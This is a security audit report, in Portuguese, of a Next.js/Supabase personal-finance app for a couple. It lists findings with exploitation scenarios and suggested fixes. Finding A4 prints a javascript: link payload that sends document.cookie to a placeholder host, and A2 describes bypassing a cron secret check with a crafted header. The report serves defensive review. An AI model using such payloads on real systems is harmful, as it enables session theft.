# Relatório de Segurança — Financeiro do Casal

Data: 2026-09-05
Escopo: `src/`, `supabase/migrations/0001..0012` + `seed_casal.sql`, `next.config.ts`, `vercel.json`, `public/sw.js`, `package.json` (`npm audit --omit=dev`).
Método: leitura integral das 12 migrations, de todos os 17 arquivos `"use server"`, do proxy/middleware/auth, da rota de cron, do push e da busca global. Nenhum arquivo do projeto foi modificado. Do `.env.local` foram conferidos apenas os NOMES das variáveis (`NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`, `SUPABASE_SERVICE_ROLE_KEY`, `NEXT_PUBLIC_VAPID_PUBLIC_KEY`, `VAPID_PRIVATE_KEY`, `VAPID_SUBJECT`, `CRON_SECRET`) — batem com o `.env.local.example`.

Versões instaladas: next 16.3.0, @supabase/ssr 0.12.4, supabase-js 2.112.2, web-push 3.6.7.

Resumo por severidade: 0 CRÍTICO · 1 ALTO · 1 MÉDIO · 7 BAIXO · 10 INFO.

---

## Achados confirmados

### [ALTO] A1 — O proxy de autenticação bloqueia a própria rota de cron

**Arquivos:** `src/proxy.ts:8-12`, `src/lib/supabase/middleware.ts:4-10` e `:69-76`, `vercel.json:4`.

**O que acontece:** o matcher do proxy (`/((?!_next/static|_next/image|favicon.ico|.*\.(?:svg|png|jpg|jpeg|gif|webp|ico)$).*)`) cobre `/api/cron/push-reminders`. `PUBLIC_PATHS` só contém `/login`, `/auth`, `/manifest.webmanifest`, `/icon`, `/apple-icon`. A Vercel Cron chama a rota com `Authorization: Bearer <CRON_SECRET>` mas sem cookie de sessão Supabase, então em `middleware.ts:62-67` `getUser()` devolve `null`, `authed=false`, e em `:72-76` a request recebe **307 → /login** antes de chegar ao handler.

**Consequência:** o `GET` em `route.ts:93` nunca executa em produção. Os lembretes de vencimento não são enviados e a verificação de `CRON_SECRET` é código morto hoje. Do ponto de vista de segurança o resultado é "fail-closed" (nada exposto), mas a funcionalidade inteira está quebrada e o log da Vercel pode mostrar "sucesso" se o cron seguir o redirect até a página de login (ver Suspeitas S3).

**Como confirmar:** Vercel → Deployments → Cron Jobs → ver resposta da última execução (deve aparecer 307 ou o HTML do login).

**Correção sugerida** — excluir a rota do matcher (a rota já tem sua própria autenticação por secret, corrigida em A2):

```ts
// src/proxy.ts
export const config = {
  matcher: [
    "/((?!_next/static|_next/image|favicon.ico|api/cron|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|mp3)$).*)",
  ],
};
```

Alternativa: adicionar `"/api/cron"` em `PUBLIC_PATHS` (`middleware.ts:4`). A exclusão no matcher é preferível porque evita rodar o `getUser()` (round-trip) a cada chamada do cron.

---

### [MÉDIO] A2 — Verificação do `CRON_SECRET` não é fail-closed nem em tempo constante

**Arquivo:** `src/app/api/cron/push-reminders/route.ts:94-97`

```ts
const auth = request.headers.get("authorization");
if (auth !== `Bearer ${process.env.CRON_SECRET}`) {
```

**Cenário de exploração:** se `CRON_SECRET` não estiver definido no ambiente da Vercel (ou for apagado numa migração de projeto/preview), o template literal vira a string `"Bearer undefined"`. Qualquer pessoa que faça `GET /api/cron/push-reminders` com `Authorization: Bearer undefined` passa. Se a variável existir mas estiver vazia, o header `Authorization: Bearer ` (com espaço) passa. Hoje isso está mascarado por A1; ao corrigir A1 esse check vira a única barreira.

**Impacto ao passar:** o atacante não recebe dados (a resposta é só `{ok, enviados, limpos}`), mas (1) dispara notificações push para todos os aparelhos do casal — e o corpo da notificação contém descrição e valor (`route.ts:203-207`, `:234-238`), (2) pode repetir a chamada indefinidamente (spam / custo de function), (3) força a limpeza de subscriptions que responderem 404/410.

Além disso `!==` faz comparação byte a byte com early-exit. Em rede o timing é ruidoso, mas a correção é trivial.

**Correção sugerida:**

```ts
import { timingSafeEqual } from "node:crypto";

function cronAutorizado(request: Request): boolean {
  const secret = process.env.CRON_SECRET;
  if (!secret || secret.length < 16) return false; // fail-closed
  const header = request.headers.get("authorization") ?? "";
  const esperado = Buffer.from(`Bearer ${secret}`);
  const recebido = Buffer.from(header);
  return (
    esperado.length === recebido.length && timingSafeEqual(esperado, recebido)
  );
}

export async function GET(request: Request) {
  if (!cronAutorizado(request)) {
    return new Response("Unauthorized", { status: 401 });
  }
  ...
```

---

### [BAIXO] A3 — Nenhum header de segurança HTTP configurado

**Arquivo:** `next.config.ts:4-8` (não há `headers()`).

**Situação:** o app não envia `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy` nem `X-Content-Type-Options`. HSTS depende da Vercel (aplicado automaticamente em `*.vercel.app`; em domínio próprio precisa ser conferido).

**Por que é só BAIXO:** os cookies de sessão do `@supabase/ssr` são `SameSite=Lax` por padrão (`node_modules/@supabase/ssr/dist/main/utils/constants.js:6`), então um `<iframe>` em site de terceiros recebe a página de login e não a sessão — clickjacking com sessão não funciona. Não foi encontrado nenhum sink de XSS que um CSP precisaria conter.

**Correção sugerida** (frame-ancestors + básicos; CSP completo exige `nonce` para o script inline de tema em `theme-init.tsx`, então comece sem `script-src` restritivo):

```ts
// next.config.ts
const securityHeaders = [
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Content-Security-Policy", value: "frame-ancestors 'none'" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
];

const nextConfig: NextConfig = {
  turbopack: { root: path.resolve(__dirname) },
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }];
  },
};
```

---

### [BAIXO] A4 — `compras_futuras.link` aceita qualquer esquema de URL (inclusive `javascript:`)

**Arquivos:** `src/app/(app)/compras-futuras/actions.ts:45` (parse sem validação) → `src/app/(app)/compras-futuras/page.tsx:310-318` (`<a href={item.link} target="_blank" rel="noopener noreferrer">`).

**Cenário:** o parceiro A cadastra um item com link `javascript:fetch('https://x.example/?c='+document.cookie)`. O parceiro B abre `/compras-futuras` e clica no ícone de link → o script executa na origem do app, na sessão de B. Como os cookies de sessão são `httpOnly:false` (padrão do `@supabase/ssr`), o token de B é legível por JS. React 19 apenas emite warning para `javascript:` em `href`, não bloqueia. `rel="noopener noreferrer"` protege contra tab-nabbing, não contra isso.

**Por que é só BAIXO:** exige um dos dois donos agir contra o outro, e os dois já têm acesso idêntico aos dados.

**Correção sugerida** (`actions.ts`, dentro de `parseFormData`):

```ts
const linkRaw = String(formData.get("link") ?? "").trim();
let link: string | null = null;
if (linkRaw) {
  try {
    const u = new URL(linkRaw);
    if (u.protocol !== "http:" && u.protocol !== "https:") return "Link inválido.";
    link = u.toString();
  } catch {
    return "Link inválido.";
  }
}
```

---

### [BAIXO] A5 — FKs de "pertencimento" não são verificadas contra o casal (a checagem de FK ignora RLS)

**Arquivos e campos vindos do cliente sem validação de dono:**
- `src/app/(app)/despesas/actions.ts:47,132` — `cartao_id` em `compras_cartao`
- `src/app/(app)/cartoes/[id]/actions.ts:23,104` — `cartao_id` em `compras_cartao`
- `src/app/(app)/cartoes/[id]/assinatura-actions.ts:24,98` — `cartao_id` em `assinaturas_cartao`
- `src/app/(app)/cartoes/actions.ts:18,75` — `banco_id` em `cartoes`
- `src/app/(app)/dividas/[id]/actions.ts:17,52` — `divida_id` em `pagamentos_divida`
- `src/app/(app)/pagar/actions.ts:10,48` — `conta_recorrente_id` em `lancamentos`
- `src/app/(app)/pagar/actions.ts:73,105` — `cartao_id` em `pagamentos_fatura`

**Por que RLS não cobre:** todas as policies (`0001..0012`) checam só `casal_id = current_casal_id()`. A verificação da FK (`references public.cartoes(id)`) é feita pelo Postgres como dono da tabela e não passa por RLS, então um usuário autenticado do casal A pode inserir uma linha com `casal_id = A` e `cartao_id` de um cartão do casal B. Basta chamar a Server Action com um UUID alheio (ou a REST do Supabase direto com a anon key + seu JWT).

**Impacto real:** não há vazamento de leitura (todas as leituras filtram por `casal_id` via RLS, inclusive as do cron em `route.ts:145-176`). O que existe é (a) integridade: a linha "órfã" some se B apagar o cartão (`on delete cascade`), e (b) negação de serviço pontual em `pagamentos_fatura`: o `unique (cartao_id, mes_referencia)` (`0011:29`) permite que A "ocupe" a fatura de B daquele mês; o `upsert` de B (`pagar/actions.ts:102-112`) cai no conflito de uma linha que a RLS não deixa B atualizar e falha. Com um único casal no banco isso é teórico; vira relevante se o app um dia hospedar mais casais.

**Correção sugerida** (banco, cobre todas as rotas de uma vez — trigger genérico por FK):

```sql
create or replace function public.assert_mesmo_casal()
returns trigger language plpgsql security definer set search_path = public as $$
declare v_casal uuid;
begin
  if TG_ARGV[0] = 'cartoes' then
    select casal_id into v_casal from public.cartoes where id = new.cartao_id;
  elsif TG_ARGV[0] = 'bancos' then
    select casal_id into v_casal from public.bancos where id = new.banco_id;
  elsif TG_ARGV[0] = 'dividas' then
    select casal_id into v_casal from public.dividas where id = new.divida_id;
  elsif TG_ARGV[0] = 'contas_recorrentes' then
    if new.conta_recorrente_id is null then return new; end if;
    select casal_id into v_casal from public.contas_recorrentes where id = new.conta_recorrente_id;
  end if;
  if v_casal is distinct from new.casal_id then
    raise exception 'registro referenciado pertence a outro casal';
  end if;
  return new;
end $$;

create trigger compras_cartao_mesmo_casal before insert or update on public.compras_cartao
  for each row execute function public.assert_mesmo_casal('cartoes');
create trigger assinaturas_cartao_mesmo_casal before insert or update on public.assinaturas_cartao
  for each row execute function public.assert_mesmo_casal('cartoes');
create trigger pagamentos_fatura_mesmo_casal before insert or update on public.pagamentos_fatura
  for each row execute function public.assert_mesmo_casal('cartoes');
create trigger cartoes_mesmo_casal before insert or update on public.cartoes
  for each row execute function public.assert_mesmo_casal('bancos');
create trigger pagamentos_divida_mesmo_casal before insert or update on public.pagamentos_divida
  for each row execute function public.assert_mesmo_casal('dividas');
create trigger lancamentos_mesmo_casal before insert or update on public.lancamentos
  for each row execute function public.assert_mesmo_casal('contas_recorrentes');
```

Alternativa só em código: antes do insert, `select id from cartoes where id = cartao_id` com o client RLS-scoped (mesmo padrão já usado em `resolverCategoria` e `resolverQuemGastou`).

---

### [BAIXO] A6 — `unsubscribePush` apaga por `endpoint` sem restringir ao próprio usuário

**Arquivo:** `src/lib/push/actions.ts:58-61`

```ts
await supabase.from("push_subscriptions").delete().eq("endpoint", endpoint);
```

**Cenário:** o parceiro A, sabendo o `endpoint` do aparelho de B (a RLS de `push_subscriptions` deixa A ler todas as linhas do casal via REST), chama `unsubscribePush(endpointDeB)` e B para de receber lembretes sem saber. O `subscribePush` (`:32-41`) grava `profile_id: user.id` corretamente, então basta filtrar por ele no delete.

**Correção:**

```ts
.delete().eq("endpoint", endpoint).eq("profile_id", user.id);
```

---

### [BAIXO] A7 — Corpo da notificação push expõe descrição e valor na tela de bloqueio

**Arquivo:** `src/app/api/cron/push-reminders/route.ts:203-207` e `:234-238`

Ex.: `"Aluguel vence em 2 dia(s) — R$ 1.850,00"`, `"Nubank: R$ 3.412,90"`. Em trânsito o payload é cifrado pelo `web-push` (chaves `p256dh`/`auth` da subscription), então o serviço de push (Google/Apple/Mozilla) não lê. A exposição é só na tela de bloqueio do celular e no centro de notificações.

**Correção (opcional, decisão de produto):** enviar texto genérico (`"Uma conta vence em 2 dias"`) e deixar o valor para o clique, ou incluir o valor apenas no `data` e montar o corpo no SW conforme uma preferência local. Se decidir manter, é uma escolha consciente do dono.

---

### [BAIXO] A8 — Página de login reflete texto arbitrário vindo de `?error=`

**Arquivos:** `src/app/login/page.tsx:22,65-69`; origem em `login/actions.ts:23-25` e `lib/auth.ts:46-49`.

**Cenário:** um link `https://<app>/login?error=Sua%20senha%20expirou.%20Envie%20a%20nova%20para%20suporte%40...` mostra a frase dentro do card de login com estilo de erro oficial. React escapa HTML (sem XSS), mas serve para phishing "com cara do app".

**Correção:** trocar a mensagem livre por código e mapear no servidor:

```ts
// actions.ts
redirect("/login?error=credenciais");
// page.tsx
const MENSAGENS: Record<string, string> = {
  credenciais: "Email ou senha incorretos.",
  campos: "Preencha email e senha.",
  perfil: "Profile não vinculado ao casal.",
};
const error = MENSAGENS[String(params.error)] ?? null;
```

---

### [BAIXO] A9 — `npm audit --omit=dev`: 1 alta + 1 moderada, ambas via `shadcn` (CLI) em `dependencies`

**Arquivo:** `package.json:22` (`"shadcn": "^4.16.2"` em `dependencies`).

Saída do audit:
- **fast-uri 3.1.5 — HIGH** (GHSA-5jgf-p345-68v8, GHSA-f65p-4m7j-42xc, GHSA-fph4-wmhf-6fwf, GHSA-jqff-g426-hqxp — host confusion / SSRF na normalização de URL)
- **qs 6.15.3 — MODERATE** (GHSA-x5fp-wj9c-mxmx, GHSA-4mjr-xmp4-gh2g)

Árvore: `shadcn → @modelcontextprotocol/sdk → ajv → fast-uri` e `shadcn → @modelcontextprotocol/sdk → express → qs`. `grep` confirma que nada em `src/` importa `shadcn`; é ferramenta de linha de comando para gerar componentes. Os pacotes vulneráveis não entram no bundle do app, então o risco em runtime é nulo — mas ficam instalados no build da Vercel e o audit vai continuar acusando.

**Correção:** `npm uninstall shadcn` (usar `npx shadcn@latest add ...` quando precisar) ou `npm install -D shadcn`. Depois `npm audit --omit=dev` deve zerar.

---

### [INFO] I1 — Server Actions de update/delete não verificam sessão explicitamente

**Arquivos:** todos os `updateX`/`deleteX`/`toggleX` (ex.: `rendas/actions.ts:69-100`, `cartoes/actions.ts:86-121`, `despesas/actions.ts:167-218`, `compras-futuras/actions.ts:94-143`, `pagar/actions.ts:58-66,120-128`).

Elas confiam em (1) o proxy barrar POSTs sem sessão e (2) a RLS filtrar por casal. Ambos funcionam hoje. Efeitos colaterais: sem sessão a query roda como `anon`, afeta 0 linhas e a action retorna `{ ok: true }` (sucesso silencioso); e os docs do Next 16 (`proxy.md:217-219`) avisam que um refactor do matcher remove a cobertura sem aviso. Também não há validação de que `id` é UUID — um valor inválido produz erro `invalid input syntax for type uuid` devolvido ao cliente (ver I2).

**Sugestão:** um helper `requireUser()` (usa `getClaims()`, sem round-trip) chamado no topo de cada action, e `z.string().uuid()`/regex no `id`.

### [INFO] I2 — `error.message` do PostgREST devolvido cru ao cliente

Padrão em todas as actions (`return { error: error.message }`). Expõe nomes de constraints/colunas (`compras_cartao_pagas_menor_total_check`, etc.). Sem risco direto num app de 2 usuários; mapear os códigos comuns (`23505`, `23514`, `22P02`) para frases amigáveis e logar o resto no servidor.

### [INFO] I3 — Argumentos posicionais de actions sem validação de formato

`pagar/actions.ts:10-16` (`dataReferencia`, `quinzena`) e `:73-78` (`mesReferencia`), `dividas/[id]/actions.ts:65`, `cartoes/[id]/actions.ts:160`, etc. Hoje o banco rejeita valores inválidos via `check`/tipo (`lancamentos.quinzena in (15,30)`, coluna `date`), mas a validação deveria estar na action (`/^\d{4}-\d{2}-01$/`).

### [INFO] I4 — Policies RLS aplicam-se a `public` (inclui `anon`) e `current_casal_id()` é executável por `anon`

`0001_schema.sql:112-141` e demais: `create policy ... for all using (...)` sem `to authenticated`. Seguro na prática porque `auth.uid()` é `null` para `anon` e `casal_id = null` nunca é verdadeiro. `current_casal_id()` (`0001:90-98`) é `security definer` com `search_path = public` travado (bom) e fica exposta em `/rest/v1/rpc/current_casal_id` — para `anon` devolve `null`, para o usuário devolve o próprio `casal_id` (não sensível). Endurecimento:

```sql
revoke execute on function public.current_casal_id() from public, anon;
grant  execute on function public.current_casal_id() to authenticated;
-- e, em cada policy: create policy ... on public.x for all to authenticated using (...) with check (...);
```

### [INFO] I5 — Um parceiro pode editar/apagar o `casais` e o `profiles` do outro

`0001:112-122`: `casais_scope` e `profiles_scope` são `for all`. Qualquer um dos dois pode `delete from casais` (cascateia TODAS as tabelas) ou trocar `papel`/`nome` do outro. Entre duas pessoas de confiança é aceitável, mas um `delete` acidental via REST é irreversível. Sugestão: policies separadas — `for select` liberado, `for update` em `profiles` restrito a `id = auth.uid()`, sem policy de `delete` em `casais`/`profiles` (deleção só pelo painel/service role).

### [INFO] I6 — Cookies de sessão são `httpOnly: false`

Padrão do `@supabase/ssr` (`constants.js:7`), necessário para o client de browser. Consequência: qualquer XSS futuro rouba a sessão. Não foi encontrado XSS (único `dangerouslySetInnerHTML` é o script constante em `theme-init.tsx:17`). Mantém a importância de A3/A4.

### [INFO] I7 — `service.ts` sem `import "server-only"`

`src/lib/supabase/service.ts`. Só o cron importa (confirmado por grep em `src/`); `SUPABASE_SERVICE_ROLE_KEY` não tem prefixo `NEXT_PUBLIC_`, então não vaza pro bundle. Adicionar `import "server-only"` na linha 1 faz o build falhar se alguém importar num Client Component por engano.

### [INFO] I8 — `seed_casal.sql` contém os emails reais dos dois usuários

`supabase/seed_casal.sql:27-28`. É PII num arquivo que tende a ir para o repositório. Trocar por placeholders e passar os emails via `\set` do psql ou variáveis do painel.

### [INFO] I9 — Revogação de sessão só surte efeito ao expirar o JWT

`middleware.ts:46` e `auth.ts:23` usam `getClaims()` (verificação local, sem round-trip). Um usuário deslogado remotamente ou banido no painel continua autenticado até o `exp` (1 h por padrão). É a troca de performance escolhida conscientemente; documentado aqui só para que seja lembrado ao "revogar" acesso de um aparelho perdido (mudar a senha invalida o refresh, mas o access token vigente segue válido até expirar).

### [INFO] I10 — `/sw.js` e `/sounds/*.mp3` passam pelo proxy de auth

`proxy.ts:10` não exclui `.js` nem `.mp3` da `public/`. Funciona porque o SW só é registrado dentro do layout autenticado (`(app)/layout.tsx:51`) e o browser envia cookies. Após logout, a checagem de atualização do SW recebe 307 e falha silenciosamente (o SW antigo continua). Inofensivo; se quiser evitar, incluir `sw\\.js|sounds/` na exclusão do matcher (já contemplado na regex sugerida em A1 para `mp3`).

---

## Verificado e considerado seguro (para não reabrir)

- **Busca global** (`src/components/search/actions.ts:74,88-111`): `.ilike("descricao", "%termo%")` passa o termo como valor de um filtro simples; PostgREST só interpreta vírgulas/parênteses em `in.()` e `or()`, nunca dentro do valor de `ilike`. Não há injeção de filtro. O único efeito é que `%` e `_` do usuário viram curingas — ele amplia a própria busca, já limitada pela RLS. Se quiser, escapar com `termo.replace(/[%_\\]/g, "\\$&")`.
- **`.or()` com interpolação** (`(app)/page.tsx:207`, `lib/sobra.ts:164`, 6 relatórios): a string interpolada é sempre `primeiroDia` gerado por `buildMes()` a partir de `parseMesParam()` (`lib/mes.ts:58-66`), que valida com `/^(\d{4})-(\d{2})$/` e cai no mês atual em caso inválido. Input do usuário nunca chega cru ao `.or()`.
- **CSRF em Server Actions**: Next 16 compara `Origin` com `Host`/`X-Forwarded-Host` e só aceita POST (`data-security.md:546-552`); `serverActions.allowedOrigins` não está configurado (bom — padrão same-origin). Cookies `SameSite=Lax` reforçam.
- **Open redirect**: não existe parâmetro `next=`/`redirectTo`; todos os `redirect()` são para caminhos fixos.
- **Enumeração de email no login**: Supabase devolve `Invalid login credentials` tanto para email inexistente quanto para senha errada; a mensagem é repassada sem distinção.
- **Service role**: `createServiceClient()` é importado apenas em `route.ts:2` (grep em todo `src/`). Todas as 6 queries do cron filtram `.eq("casal_id", casalId)` (`route.ts:145-176`); a única sem filtro é a de `push_subscriptions` (`:112-114`), que é justamente a fonte da lista de casais.
- **`casal_id`/`criado_por` sempre do servidor**: nenhum `formData.get("casal_id")` no projeto (grep). Todos os inserts pegam `casal_id` de `profiles` via RLS e `criado_por: user.id`. `marcarComprada` usa `item.casal_id` de uma linha lida sob RLS (`compras-futuras/actions.ts:169-184`).
- **`categoria_id` e `quem_gastou`**: validados por lookup RLS-scoped (`categorias-server.ts:30-45`, `membros-server.ts:27-43`) — não dá para apontar para categoria/profile de outro casal.
- **Push**: `subscribePush` grava `profile_id = user.id` e `casal_id` do profile; `endpoint` tem `unique` (`0009:14`). O SW (`public/sw.js`) só usa `title/body/url` do payload e abre `url` relativa; scope padrão `/`.
- **Manifest/ícones**: `manifest.webmanifest`, `/icon`, `/apple-icon` estão públicos (necessário para PWA) e não expõem nada.
- **`error.tsx`**: mensagem genérica, não vaza stack/`digest`.
- **Links externos**: `compras-futuras/page.tsx:312-314` usa `target="_blank" rel="noopener noreferrer"`.

---

## Suspeitas (não confirmadas — dependem de configuração fora do código)

- **S1 — "Enable Sign Ups" desabilitado no painel Supabase.** O `seed_casal.sql:8-9` instrui a desligar, mas isso não é verificável no código. Se estiver ligado, qualquer pessoa cria conta com a anon key; a RLS ainda a deixa sem acesso a nada (`current_casal_id()` = null, e `casais`/`profiles` exigem `with check` que ela não satisfaz) — mas vale conferir em Authentication → Providers → Email.
- **S2 — Endpoints de OTP/magic link do GoTrue** ficam acessíveis com a anon key mesmo com o app usando só senha. Terceiros podem disparar emails de "magic link"/"reset" para os dois endereços (spam, sem comprometimento). Mitigação: Auth → Rate Limits + Captcha (Turnstile) no painel.
- **S3 — Vercel Cron pode estar registrando "sucesso"** ao seguir o 307 de A1 e receber 200 da página de login. Só os logs confirmam.
- **S4 — Rate limiting de login** depende exclusivamente dos limites do Supabase Auth por IP (conferir em Auth → Rate Limits). Não há limite no app; com 2 contas e senhas fortes é aceitável, mas Captcha é a proteção barata.
- **S5 — HSTS em domínio próprio**: a Vercel aplica em `*.vercel.app`; se houver domínio customizado, conferir o header na resposta.
- **S6 — Comportamento do React 19 com `javascript:` em `href`** (A4): a análise assume que React apenas alerta e não bloqueia; se uma versão futura bloquear, A4 cai para INFO.

---

## O que está bem feito

- **RLS completa e uniforme**: as 15 tabelas (`casais, profiles, rendas, contas_recorrentes, lancamentos, bancos, cartoes, compras_cartao, dividas, pagamentos_divida, assinaturas_cartao, categorias, push_subscriptions, pagamentos_fatura, compras_futuras`) têm `enable row level security` e uma policy `for all` com `using` + `with check` em `casal_id = current_casal_id()`. Nenhuma `using (true)`, nenhuma tabela esquecida, nenhum `grant` extra para `anon`.
- `current_casal_id()` é `security definer` com `set search_path = public`, `stable`, e referencia `public.profiles`/`auth.uid()` totalmente qualificados.
- Service role isolado num único arquivo, usado só no cron, com o comentário de regra crítica e todas as queries filtradas por casal.
- `casal_id` e `criado_por` nunca vêm do formulário; FKs "lógicas" (`categoria_id`, `quem_gastou`) são revalidadas por lookup sob RLS.
- Proxy é deny-by-default (só assets e 5 caminhos públicos), com refresh proativo de sessão 5 min antes de expirar.
- Nenhum input do usuário alcança `.or()`/filtros compostos; `parseMesParam` valida com regex.
- Sem XSS: único `dangerouslySetInnerHTML` é um script constante; tudo o mais passa pelo escaping do React. Links externos com `noopener noreferrer`.
- Server Actions parseiam e normalizam todos os campos (valores BRL, datas com regex, enums com listas fechadas, parcelas 1–60), e os `check` constraints do banco repetem as regras.
- Payload de push cifrado ponta a ponta pelo Web Push; VAPID configurado por env vars sem prefixo público (exceto a chave pública, que precisa ser pública).
